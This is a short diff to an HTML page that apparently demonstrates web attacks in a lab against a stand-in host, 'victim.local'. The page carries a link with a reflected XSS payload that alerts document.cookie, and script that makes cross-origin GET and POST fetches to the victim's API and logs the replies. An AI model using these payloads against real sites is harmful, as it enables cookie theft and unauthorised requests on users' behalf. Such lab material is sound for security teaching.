@@ -11,13 +11,22 @@
     <br />
     <a
       href="https://victim.local/?message=%3Cscript%3Ealert(document.cookie)%3C/script%3E"
+      target="_blank"
       >Exploit Victim App</a
     >
     <br />
     <img src="https://victim.local/image.jpg" alt="Image" />
 
     <script>
-      fetch("https://victim.local/api/get");
+      // get
+      fetch("https://victim.local/api/get").then((response) =>
+        response.text().then((data) => console.log(data))
+      );
+
+      // post
+      fetch("https://victim.local/api/post").then((response) =>
+        response.text().then((data) => console.log(data))
+      );
     </script>
   </body>
 </html>
